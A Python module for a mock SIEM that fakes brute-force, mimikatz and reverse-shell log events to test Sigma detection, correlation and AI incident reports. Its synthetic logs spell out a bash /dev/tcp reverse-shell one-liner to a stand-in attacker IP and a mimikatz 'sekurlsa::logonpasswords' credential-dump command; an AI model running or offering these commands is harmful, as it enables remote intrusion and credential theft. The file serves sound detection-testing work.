import os
import asyncio
import datetime
import uuid
import logging
from sqlalchemy.orm import Session
from ..models import RawEvent, Alert, Incident
from ..detection.engine import SigmaEngine
from ..correlation.engine import CorrelationEngine
from ..enrichment.threat_intel import enrich_ioc
from ..ai.analyst import generate_incident_analysis

logger = logging.getLogger(__name__)

# Directory where Sigma rules are stored
RULES_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "detection", "rules")

class AttackSimulator:
    def __init__(self, db_session_factory):
        self.db_session_factory = db_session_factory
        self.sigma_engine = SigmaEngine(RULES_DIR)
        self.correlation_engine = CorrelationEngine(window_minutes=15)

    async def run_simulation(self, scenario: str):
        """
        Runs a specific simulation scenario in a background task.
        """
        logger.info(f"Starting simulation scenario: {scenario}")
        
        if scenario == "brute_force":
            await self._simulate_brute_force()
        elif scenario == "mimikatz":
            await self._simulate_mimikatz()
        elif scenario == "reverse_shell":
            await self._simulate_reverse_shell()
        else:
            logger.error(f"Unknown simulation scenario: {scenario}")

    def _ingest_log(self, db: Session, source: str, host: str, user: str, event_id: int, message: str, fields: dict) -> RawEvent:
        """
        Helper to write a raw log into the database (mock SIEM index) and run it through detection.
        """
        event = RawEvent(
            timestamp=datetime.datetime.utcnow(),
            host=host,
            user=user,
            source=source,
            event_id=event_id,
            message=message,
            fields=fields
        )
        db.add(event)
        db.commit()
        db.refresh(event)

        # 1. Run through Sigma Engine
        event_dict = {
            "id": event.id,
            "timestamp": event.timestamp.isoformat() if isinstance(event.timestamp, datetime.datetime) else str(event.timestamp),
            "host": event.host,
            "user": event.user,
            "source": event.source,
            "event_id": event.event_id,
            "message": event.message,
            "fields": event.fields
        }
        
        alerts = self.sigma_engine.run_rules(event_dict)
        
        # 2. For each triggered alert, save to DB and run through Correlation Engine
        for alert_data in alerts:
            alert_timestamp = alert_data["timestamp"]
            if isinstance(alert_timestamp, str):
                try:
                    alert_timestamp = datetime.datetime.fromisoformat(alert_timestamp)
                except Exception:
                    alert_timestamp = datetime.datetime.utcnow()

            alert = Alert(
                id=alert_data["id"],
                rule_id=alert_data["rule_id"],
                rule_name=alert_data["rule_name"],
                severity=alert_data["severity"],
                description=alert_data["description"],
                host=alert_data["host"],
                user=alert_data["user"],
                log_source=alert_data["log_source"],
                mitre_techniques=alert_data["mitre_techniques"],
                details=alert_data["details"],
                timestamp=alert_timestamp
            )
            db.add(alert)
            db.commit()
            
            # Group into Incidents
            incident = self.correlation_engine.correlate_alert(db, alert)
            
            # Post-processing: Automatically trigger AI Analysis if incident is high/critical
            if incident.severity in ["High", "Critical"] and not incident.ai_summary:
                asyncio.create_task(self._enrich_incident_ai(incident.id))
                
        return event

    async def _enrich_incident_ai(self, incident_id: int):
        """
        Asynchronously generates AI report for an incident.
        """
        await asyncio.sleep(2.0) # Small delay to ensure database session updates are complete
        db = self.db_session_factory()
        try:
            incident = db.query(Incident).filter(Incident.id == incident_id).first()
            if incident:
                alerts_list = [
                    {
                        "rule_name": a.rule_name,
                        "severity": a.severity,
                        "description": a.description,
                        "details": a.details
                    } for a in incident.alerts
                ]
                incident_data = {
                    "title": incident.title,
                    "description": incident.description,
                    "host_affected": incident.host_affected,
                    "user_affected": incident.user_affected,
                    "severity": incident.severity,
                    "risk_score": incident.risk_score
                }
                
                ai_report = await generate_incident_analysis(incident_data, alerts_list)
                incident.ai_summary = ai_report.get("summary")
                incident.ai_playbook = ai_report.get("playbook")
                
                db.add(incident)
                db.commit()
                logger.info(f"AI report generated successfully for Incident {incident_id}")
        except Exception as e:
            logger.error(f"Error generating AI report for Incident {incident_id}: {e}")
        finally:
            db.close()

    async def _simulate_brute_force(self):
        db = self.db_session_factory()
        host = "WS-PROD-01"
        attacker_ip = "203.0.113.19"
        
        try:
            # 1. 15 failed logins
            for i in range(15):
                self._ingest_log(
                    db=db,
                    source="Winlogbeat-Security",
                    host=host,
                    user="admin",
                    event_id=4625,
                    message=f"An account failed to log on. Source Network Address: {attacker_ip}. Logon Type: 3 (Network).",
                    fields={
                        "SubStatus": "0xC000006A", # Password incorrect
                        "IpAddress": attacker_ip,
                        "LogonType": 3,
                        "TargetUserName": "admin"
                    }
                )
                await asyncio.sleep(0.3)
                
            # 2. 1 successful login
            self._ingest_log(
                db=db,
                source="Winlogbeat-Security",
                host=host,
                user="admin",
                event_id=4624,
                message=f"An account was successfully logged on. Source Network Address: {attacker_ip}. Logon Type: 3 (Network).",
                fields={
                    "IpAddress": attacker_ip,
                    "LogonType": 3,
                    "TargetUserName": "admin"
                }
            )
            await asyncio.sleep(1.0)
            
            # 3. Post exploitation: running commands (recon)
            self._ingest_log(
                db=db,
                source="Winlogbeat-Sysmon",
                host=host,
                user="admin",
                event_id=1, # Process Create
                message="Process Create: Image: C:\\Windows\\System32\\whoami.exe, CommandLine: whoami, ParentImage: C:\\Windows\\System32\\cmd.exe",
                fields={
                    "Image": "C:\\Windows\\System32\\whoami.exe",
                    "CommandLine": "whoami",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    "ParentCommandLine": "cmd.exe"
                }
            )
        finally:
            db.close()

    async def _simulate_mimikatz(self):
        db = self.db_session_factory()
        host = "WS-PROD-01"
        user = "admin"
        
        try:
            # 1. Download file: mimikatz.exe
            self._ingest_log(
                db=db,
                source="Winlogbeat-Sysmon",
                host=host,
                user=user,
                event_id=11, # File Create
                message="File Create: TargetFilename: C:\\Users\\admin\\Downloads\\mimikatz.exe",
                fields={
                    "TargetFilename": "C:\\Users\\admin\\Downloads\\mimikatz.exe",
                    "Hashes": "MD5=9f8db278125b2d97424fa7bb0f592652,SHA256=2566ecb754876b2cd18843df3d5236cf5e381643c749fbde48128362cc8dcf2c"
                }
            )
            await asyncio.sleep(1.5)

            # 2. Registry modification (disable LSA protection / prep)
            self._ingest_log(
                db=db,
                source="Winlogbeat-Sysmon",
                host=host,
                user="SYSTEM",
                event_id=13, # Registry Value Set
                message="Registry Value Set: TargetObject: HKLM\\System\\CurrentControlSet\\Control\\Lsa\\LsaCfgFlags, Details: 0",
                fields={
                    "RegistryKey": "HKLM\\System\\CurrentControlSet\\Control\\Lsa\\LsaCfgFlags",
                    "Details": "0"
                }
            )
            await asyncio.sleep(1.0)
            
            # 3. Mimikatz Process execution
            self._ingest_log(
                db=db,
                source="Winlogbeat-Sysmon",
                host=host,
                user="SYSTEM",
                event_id=1, # Process creation
                message="Process Create: Image: C:\\Users\\admin\\Downloads\\mimikatz.exe, CommandLine: mimikatz.exe \"sekurlsa::logonpasswords\" exit, ParentImage: C:\\Windows\\System32\\cmd.exe",
                fields={
                    "Image": "C:\\Users\\admin\\Downloads\\mimikatz.exe",
                    "CommandLine": "mimikatz.exe \"sekurlsa::logonpasswords\" exit",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    "ParentCommandLine": "cmd.exe"
                }
            )
        finally:
            db.close()

    async def _simulate_reverse_shell(self):
        db = self.db_session_factory()
        host = "linux-srv-01"
        user = "www-data"
        attacker_ip = "198.51.100.45"
        
        try:
            # 1. Spawn shell process via Web Server (Apache/PHP exploit)
            self._ingest_log(
                db=db,
                source="Filebeat-auditd",
                host=host,
                user=user,
                event_id=3000, # Process execution log in Auditd
                message=f"type=EXECVE msg=audit: argc=4 a0=\"bash\" a1=\"-i\" a2=\">&\" a3=\"/dev/tcp/{attacker_ip}/4444\"",
                fields={
                    "Image": "/bin/bash",
                    "CommandLine": f"bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1",
                    "ParentImage": "/usr/sbin/apache2",
                    "ParentCommandLine": "/usr/sbin/apache2 -k start"
                }
            )
            await asyncio.sleep(1.5)
            
            # 2. Outbound Connection established
            self._ingest_log(
                db=db,
                source="Filebeat-syslog",
                host=host,
                user=user,
                event_id=None,
                message=f"kernel: [NET] Outbound connection established: {host} -> {attacker_ip}:4444",
                fields={
                    "SourceAddress": "10.0.2.15",
                    "SourcePort": 52140,
                    "DestinationAddress": attacker_ip,
                    "DestinationPort": 4444,
                    "Protocol": "tcp"
                }
            )
        finally:
            db.close()
